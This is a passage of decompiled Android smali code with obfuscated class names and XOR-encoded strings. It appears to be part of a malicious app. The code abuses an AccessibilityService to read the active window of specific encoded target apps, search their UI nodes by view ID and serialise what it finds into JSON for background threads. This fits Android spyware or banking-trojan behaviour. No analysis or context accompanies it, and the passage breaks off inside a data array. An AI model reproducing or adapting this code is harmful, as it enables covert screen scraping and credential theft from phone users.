    invoke-static {v5, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    :cond_0
    add-int/lit8 v4, v4, 0x1

    goto :goto_1

    :cond_1
    sget-object v3, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->a:Ljava/util/LinkedList;

    invoke-virtual {v3}, Ljava/util/LinkedList;->size()I

    move-result v3

    add-int/lit8 v3, v3, -0x1

    if-eq v2, v3, :cond_2

    const/16 v3, 0xb

    new-array v3, v3, [B

    fill-array-data v3, :array_2

    new-array v4, v6, [B

    fill-array-data v4, :array_3

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    :cond_2
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :cond_3
    new-instance v1, Ljava/lang/Thread;

    new-instance v2, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU$b;

    invoke-direct {v2, v0}, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU$b;-><init>(Ljava/lang/StringBuilder;)V

    invoke-direct {v1, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v1}, Ljava/lang/Thread;->start()V

    return-void

    nop

    :array_0
    .array-data 1
        0x3dt
        -0x77t
        -0x2et
        0x70t
        0x17t
        0x68t
        -0x38t
        -0x7et
        0x6dt
    .end array-data

    nop

    :array_1
    .array-data 1
        0xat
        -0x43t
        -0x19t
        0x1at
        0x71t
        0x5ft
        -0x46t
        -0x17t
    .end array-data

    :array_2
    .array-data 1
        0xdt
        0x64t
        -0x78t
        0x5dt
        0x5ct
        0x27t
        -0x6ct
        0x42t
        0x5dt
        0x33t
        -0x2at
    .end array-data

    :array_3
    .array-data 1
        0x35t
        0x57t
        -0x44t
        0x35t
        0x29t
        0x41t
        -0x13t
        0x76t
    .end array-data
.end method

.method private static o()V
    .locals 5

    .line 1
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const/4 v2, 0x0

    :goto_0
    sget-object v3, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->c:Ljava/util/LinkedList;

    invoke-virtual {v3}, Ljava/util/LinkedList;->size()I

    move-result v3

    if-ge v2, v3, :cond_1

    sget-object v3, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->c:Ljava/util/LinkedList;

    invoke-virtual {v3, v2}, Ljava/util/LinkedList;->get(I)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/m7;

    invoke-virtual {v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/m7;->e()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v3, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->c:Ljava/util/LinkedList;

    invoke-virtual {v3, v2}, Ljava/util/LinkedList;->get(I)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/m7;

    invoke-static {v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/eq;->a(Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/m7;)Lorg/json/JSONObject;

    move-result-object v3

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    sget-object v3, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->c:Ljava/util/LinkedList;

    invoke-virtual {v3}, Ljava/util/LinkedList;->size()I

    move-result v3

    add-int/lit8 v3, v3, -0x1

    if-eq v2, v3, :cond_0

    const/16 v3, 0xb

    new-array v3, v3, [B

    fill-array-data v3, :array_0

    const/16 v4, 0x8

    new-array v4, v4, [B

    fill-array-data v4, :array_1

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    :cond_0
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :cond_1
    new-instance v2, Ljava/lang/Thread;

    new-instance v3, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU$c;

    invoke-direct {v3, v1, v0}, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU$c;-><init>(Ljava/lang/StringBuilder;Ljava/lang/StringBuilder;)V

    invoke-direct {v2, v3}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v2}, Ljava/lang/Thread;->start()V

    return-void

    nop

    :array_0
    .array-data 1
        -0x4ct
        0x30t
        -0x2et
        0x2bt
        0x61t
        -0x8t
        -0x2dt
        -0x16t
        -0x1ct
        0x67t
        -0x74t
    .end array-data

    :array_1
    .array-data 1
        -0x74t
        0x3t
        -0x1at
        0x43t
        0x14t
        -0x62t
        -0x56t
        -0x22t
    .end array-data
.end method

.method private static p(Landroid/view/accessibility/AccessibilityEvent;Lcom/vknnolqo/p9sv5zvf/SM099EXd;)V
    .locals 5

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->k()Z

    move-result v0

    if-eqz v0, :cond_5

    invoke-static {p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/zf0;->a(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_5

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v0

    if-eqz v0, :cond_5

    const/16 v1, 0x14

    new-array v2, v1, [B

    fill-array-data v2, :array_0

    const/16 v3, 0x8

    new-array v4, v3, [B

    fill-array-data v4, :array_1

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_0

    new-array v2, v1, [B

    fill-array-data v2, :array_2

    new-array v4, v3, [B

    fill-array-data v4, :array_3

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_0

    const/16 v2, 0x16

    new-array v2, v2, [B

    fill-array-data v2, :array_4

    new-array v4, v3, [B

    fill-array-data v4, :array_5

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    goto/16 :goto_0

    :cond_0
    invoke-virtual {p1}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    sput-object v0, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->d:Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v0, :cond_1

    return-void

    :cond_1
    sget-boolean v0, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->U:Z

    if-nez v0, :cond_5

    sget-boolean v0, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->V:Z

    if-nez v0, :cond_5

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v0

    const/16 v2, 0x4000

    if-ne v0, v2, :cond_5

    new-array v0, v1, [B

    fill-array-data v0, :array_6

    new-array v1, v3, [B

    fill-array-data v1, :array_7

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_5

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v0

    const/4 v1, 0x1

    if-ne v0, v1, :cond_5

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object p0

    const/4 v0, 0x0

    invoke-interface {p0, v0}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object p0

    const-string v2, ""

    invoke-virtual {v2, p0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p0

    if-eqz p0, :cond_5

    sget-object p0, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->d:Landroid/view/accessibility/AccessibilityNodeInfo;

    const/16 v2, 0x29

    new-array v2, v2, [B

    fill-array-data v2, :array_8

    new-array v4, v3, [B

    fill-array-data v4, :array_9

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object p0

    if-eqz p0, :cond_2

    invoke-interface {p0}, Ljava/util/List;->isEmpty()Z

    move-result v2

    if-eqz v2, :cond_3

    :cond_2
    sget-object p0, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->d:Landroid/view/accessibility/AccessibilityNodeInfo;

    const/16 v2, 0x2f

    new-array v2, v2, [B

    fill-array-data v2, :array_a

    new-array v3, v3, [B

    fill-array-data v3, :array_b

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object p0

    :cond_3
    if-eqz p0, :cond_4

    invoke-interface {p0}, Ljava/util/List;->isEmpty()Z

    move-result p0

    if-nez p0, :cond_4

    sput-boolean v1, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->V:Z

    sput-boolean v0, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->U:Z

    invoke-static {p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/z40;->j(Lcom/vknnolqo/p9sv5zvf/SM099EXd;)V

    goto :goto_0

    :cond_4
    sput-boolean v1, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->U:Z

    sput-boolean v0, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->V:Z

    invoke-static {p1}, Lcom/vknnolqo/p9sv5zvf/TEh82iEU;->n(Lcom/vknnolqo/p9sv5zvf/SM099EXd;)V

    nop

    :cond_5
    :goto_0
    return-void

    :array_0
    .array-data 1
        -0x67t
        0xbt
        -0x56t
        0x1dt
        -0x5bt
        -0x13t
        0x5ft
        0x45t
        -0x6bt
        0xdt
        -0x5dt
        0x1dt
        -0x49t
        -0x6t
        0x48t
        0x43t
        -0x61t
        0x9t
        -0x4et
        0x5at
    .end array-data

    :array_1
    .array-data 1
        -0x6t
        0x64t
        -0x39t
        0x33t
        -0x3ct
        -0x7dt
        0x3bt
        0x37t
    .end array-data

    :array_2
    .array-data 1
        0x40t
        0x15t
        -0x46t
        0x65t
        -0x3ct
        0x6ft
        0x5t
        0x33t
        0x50t
        0x54t
        -0x5ct
        0x2at
        -0x33t
        0x7at
        0xat
        0x23t
        0x4dt
        0xet
        -0x4et
        0x39t
    .end array-data

    :array_3
    .array-data 1
        0x23t
        0x7at
        -0x29t
        0x4bt
        -0x55t
        0x1ft
        0x69t
        0x46t
    .end array-data

    :array_4
    .array-data 1
        -0x48t
        0x45t
        0x31t
        -0x7t
        0x2ft
        -0x3ft
        0x0t
        -0x3ct
        -0x57t
        0x45t
        0x2ft
        -0x7t
        0x3ft
        -0x31t
        0xat
        -0x32t
        -0x48t
        0x4ft
        0x32t
        -0x5dt
        0x29t
        -0x24t
    .end array-data

    nop

    :array_5
    .array-data 1
        -0x25t
        0x2at
        0x5ct
        -0x29t
        0x4ct
        -0x52t
        0x6ct
        -0x55t
    .end array-data

    :array_6
    .array-data 1
        0x2ct
        0x39t
        0x5dt
        -0x70t
        -0x2bt
        -0x52t
        0x30t
        0x26t
        0x20t
        0x3ft
        0x54t
        -0x70t
        -0x39t
        -0x47t
        0x27t
        0x20t
        0x2at
        0x3bt
        0x45t
        -0x29t
    .end array-data

    :array_7
    .array-data 1
        0x4ft
        0x56t
        0x30t
        -0x42t
        -0x4ct
        -0x40t
        0x54t
        0x54t
    .end array-data

    :array_8
    .array-data 1
        -0x79t
        0x6t
        0x7dt
        0x40t
        -0xft
        -0xet
        -0x42t
        -0x1ct
        -0x75t
        0x0t
        0x74t
        0x40t
        -0x1dt
        -0x1bt
        -0x57t
        -0x1et
        -0x7ft
        0x4t
        0x65t
        0x7t
        -0x56t
        -0xbt
        -0x42t
        -0x47t
        -0x78t
        0x6t
        0x73t
        0x5t
        -0x31t
        -0x8t
        -0x4dt
        -0xft
        -0x73t
        0x1dt
        0x71t
        0x2t
        -0x31t
        -0x16t
        -0x4dt
        -0xdt
        -0x6dt
    .end array-data

    nop

    :array_9
    .array-data 1
        -0x1ct
        0x69t
        0x10t
        0x6et
        -0x70t
        -0x64t
        -0x26t
        -0x6at
    .end array-data

    :array_a
    .array-data 1
        -0x4at
        0x46t
        0x47t
        0x6at
        -0x15t
        -0x7et
        -0x24t
        0x7bt
        -0x46t
        0x40t
        0x4et
        0x6at
        -0x7t
        -0x6bt
        -0x35t
        0x7dt
        -0x50t
        0x44t
        0x5ft
        0x2dt
        -0x50t
        -0x7bt
        -0x24t
        0x26t
        -0x5bt
        0x40t
        0x44t
        0x7t
        -0x1bt
        -0x80t
        -0x29t
        0x7bt
        -0x65t
        0x5ct
        0x47t
        0x21t
        -0x8t
        -0x7bt
        -0x25t
        0x42t
        -0x50t
        0x50t
        0x48t
        0x2bt
        -0x15t
        -0x62t
        -0x24t
    .end array-data

    :array_b
    .array-data 1
        -0x2bt
        0x29t
        0x2at
        0x44t
        -0x76t
        -0x14t
        -0x48t
        0x9t
    .end array-data
.end method

.method private static q(Ljava/util/List;Landroid/view/accessibility/AccessibilityNodeInfo;)V
    .locals 6

    .line 1
    invoke-interface {p0}, Ljava/util/List;->isEmpty()Z

    move-result v0

    if-eqz v0, :cond_0

    return-void

    :cond_0
    sget-boolean v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/z40;->e:Z

    if-eqz v0, :cond_1

    return-void

    :cond_1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->e:Ljava/util/ArrayList;

    invoke-virtual {v0}, Ljava/util/ArrayList;->clear()V

    const/4 v0, 0x0

    invoke-interface {p0, v0}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object p0

    check-cast p0, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez p0, :cond_2

    return-void

    :cond_2
    const/16 v1, 0x37

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v3, v2, [B

    fill-array-data v3, :array_1

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v1

    invoke-interface {v1}, Ljava/util/List;->isEmpty()Z

    move-result v3

    if-eqz v3, :cond_3

    const/16 v1, 0x2c

    new-array v1, v1, [B

    fill-array-data v1, :array_2

    new-array v3, v2, [B

    fill-array-data v3, :array_3

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v1

    invoke-interface {v1}, Ljava/util/List;->isEmpty()Z

    move-result v3

    if-eqz v3, :cond_3

    const/16 v1, 0x23

    new-array v1, v1, [B

    fill-array-data v1, :array_4

    new-array v3, v2, [B

    fill-array-data v3, :array_5

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v1

    :cond_3
    invoke-interface {v1}, Ljava/util/List;->isEmpty()Z

    move-result v3

    const/4 v4, 0x1

    if-nez v3, :cond_4

    invoke-interface {v1, v0}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-eqz v1, :cond_4

    const/4 v3, -0x1

    invoke-static {v1, v4, v0, v3}, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->d(Landroid/view/accessibility/AccessibilityNodeInfo;ZZI)V

    :cond_4
    const/16 v1, 0x2d

    new-array v1, v1, [B

    fill-array-data v1, :array_6

    new-array v3, v2, [B

    fill-array-data v3, :array_7

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v1

    invoke-interface {v1}, Ljava/util/List;->isEmpty()Z

    move-result v3

    if-eqz v3, :cond_5

    const/16 v1, 0x31

    new-array v1, v1, [B

    fill-array-data v1, :array_8

    new-array v3, v2, [B

    fill-array-data v3, :array_9

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v1

    :cond_5
    invoke-interface {v1}, Ljava/util/List;->isEmpty()Z

    move-result p1

    if-nez p1, :cond_6

    invoke-interface {v1, v0}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-eqz p1, :cond_6

    const/4 v1, -0x2

    invoke-static {p1, v4, v0, v1}, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->d(Landroid/view/accessibility/AccessibilityNodeInfo;ZZI)V

    :cond_6
    move p1, v0

    :goto_0
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v1

    if-ge p1, v1, :cond_9

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v1

    const/16 v3, 0xa

    if-le v1, v3, :cond_7

    if-ne p1, v3, :cond_7

    move v1, v4

    goto :goto_1

    :cond_7
    move v1, v0

    :goto_1
    invoke-virtual {p0, p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v3

    if-eqz v3, :cond_8

    xor-int/lit8 v5, v1, 0x1

    invoke-static {v3, v1, v5, p1}, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->d(Landroid/view/accessibility/AccessibilityNodeInfo;ZZI)V

    :cond_8
    add-int/lit8 p1, p1, 0x1

    goto :goto_0

    :cond_9
    new-instance p0, Ljava/lang/StringBuilder;

    const/16 p1, 0x15

    new-array p1, p1, [B

    fill-array-data p1, :array_a

    new-array v1, v2, [B

    fill-array-data v1, :array_b

    invoke-static {p1, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-direct {p0, p1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    :goto_2
    sget-object p0, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->e:Ljava/util/ArrayList;

    invoke-virtual {p0}, Ljava/util/ArrayList;->size()I

    move-result p1

    if-ge v0, p1, :cond_a

    invoke-virtual {p0, v0}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object p0

    check-cast p0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/m7;

    invoke-virtual {p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/m7;->e()Ljava/lang/String;

    const/4 p0, 0x2

    new-array p0, p0, [B

    fill-array-data p0, :array_c

    new-array p1, v2, [B

    fill-array-data p1, :array_d

    invoke-static {p0, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    add-int/lit8 v0, v0, 0x1

    goto :goto_2

    :cond_a
    sget-object p0, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->b:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-static {p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/z40;->j(Lcom/vknnolqo/p9sv5zvf/SM099EXd;)V

    return-void

    nop

    :array_0
    .array-data 1
        0x35t
        -0x1t
        0x64t
        -0x60t
        -0x1t
        -0x1ct
        -0x73t
        0x2t
        0x39t
        -0x7t
        0x6dt
        -0x60t
        -0x13t
        -0xdt
        -0x66t
        0x4t
        0x33t
        -0x3t
        0x7ct
        -0x19t
        -0x5ct
        -0x1dt
        -0x73t
        0x5ft
        0x3dt
        -0xbt
        0x70t
        -0x17t
        -0x15t
        -0x15t
        -0x65t
        0x14t
        0x9t
        -0x2t
        0x68t
        -0x8t
        -0x9t
        -0x13t
        -0x78t
        0x4t
        0x3ft
        -0x1t
        0x67t
        -0x2ft
        -0x4t
        -0x15t
        -0x76t
        0x1bt
        0x9t
        -0xet
        0x7ct
        -0x6t
        -0x16t
        -0x1bt
        -0x79t
    .end array-data

    :array_1
    .array-data 1
        0x56t
        -0x70t
        0x9t
        -0x72t
        -0x62t
        -0x76t
        -0x17t
        0x70t
    .end array-data

    :array_2
    .array-data 1
        0x69t
        0x7dt
        -0x2et
        -0x31t
        0x1ct
        -0x57t
        -0x16t
        0x37t
        0x65t
        0x7bt
        -0x25t
        -0x31t
        0xet
        -0x42t
        -0x3t
        0x31t
        0x6ft
        0x7ft
        -0x36t
        -0x78t
        0x47t
        -0x52t
        -0x16t
        0x6at
        0x64t
        0x73t
        -0x37t
        -0x78t
        0x1at
        -0x5at
        -0x6t
        0x2ct
        0x65t
        0x7ct
        -0x3t
        -0x80t
        0x1et
        -0x54t
        -0x34t
        0x30t
        0x7et
        0x66t
        -0x30t
        -0x71t
    .end array-data

    :array_3
    .array-data 1
        0xat
        0x12t
        -0x41t
        -0x1ft
        0x7dt
        -0x39t
        -0x72t
        0x45t
    .end array-data

    :array_4
    .array-data 1
        -0x3dt
        0x5dt
        -0x4t
        0x6et
        0x77t
        0x13t
        0x1et
        0x55t
        -0x31t
        0x5bt
        -0xbt
        0x6et
        0x65t
        0x4t
        0x9t
        0x53t
        -0x3bt
        0x5ft
        -0x1ct
        0x29t
        0x2ct
        0x14t
        0x1et
        0x8t
        -0x3et
        0x53t
        -0xet
        0x2bt
        0x49t
        0x1ft
        0xft
        0x53t
        -0x2ct
        0x5dt
        -0x1t
    .end array-data

    :array_5
    .array-data 1
        -0x60t
        0x32t
        -0x6ft
        0x40t
        0x16t
        0x7dt
        0x7at
        0x27t
    .end array-data

    :array_6
    .array-data 1
        -0x71t
        0x51t
        -0x40t
        0x6ft
        0x6at
        -0x71t
        0x18t
        0x63t
        -0x7dt
        0x57t
        -0x37t
        0x6ft
        0x78t
        -0x68t
        0xft
        0x65t
        -0x77t
        0x53t
        -0x28t
        0x28t
        0x31t
        -0x78t
        0x18t
        0x3et
        -0x77t
        0x53t
        -0x38t
        0x33t
        0x6ct
        -0x7ct
        0x12t
        0x72t
        -0x6bt
        0x61t
        -0x32t
        0x20t
        0x67t
        -0x73t
        0x23t
        0x73t
        -0x67t
        0x4at
        -0x27t
        0x2et
        0x65t
    .end array-data

    nop

    :array_7
    .array-data 1
        -0x14t
        0x3et
        -0x53t
        0x41t
        0xbt
        -0x1ft
        0x7ct
        0x11t
    .end array-data

    :array_8
    .array-data 1
        0x64t
        -0x9t
        -0x2t
        -0x7ct
        -0x73t
        0x54t
        -0x72t
        -0x6t
        0x68t
        -0xft
        -0x9t
        -0x7ct
        -0x61t
        0x43t
        -0x67t
        -0x4t
        0x62t
        -0xbt
        -0x1at
        -0x3dt
        -0x2at
        0x53t
        -0x72t
        -0x59t
        0x69t
        -0x7t
        -0x1bt
        -0x3dt
        -0x75t
        0x5bt
        -0x62t
        -0x1ft
        0x68t
        -0xat
        -0x2at
        -0x39t
        -0x77t
        0x48t
        -0x73t
        -0x13t
        0x69t
        -0x5t
        -0x16t
        -0x18t
        -0x67t
        0x4et
        -0x62t
        -0x19t
        0x69t
    .end array-data

    nop

    :array_9
    .array-data 1
        0x7t
        -0x68t
        -0x6dt
        -0x56t
        -0x14t
        0x3at
        -0x16t
        -0x78t
    .end array-data

    :array_a
    .array-data 1
        -0x5t
        0x15t
        -0x3at
        -0x21t
        0x60t
        0x42t
        -0x2dt
        0x3ft
        -0x67t
        0x6ct
        -0x15t
        -0x5ft
        0x13t
        0x77t
        -0x6ft
        0x42t
        -0x79t
        0xdt
        -0x57t
        -0x7bt
        0x6ct
    .end array-data

    nop

    :array_b
    .array-data 1
        0x1dt
        -0x77t
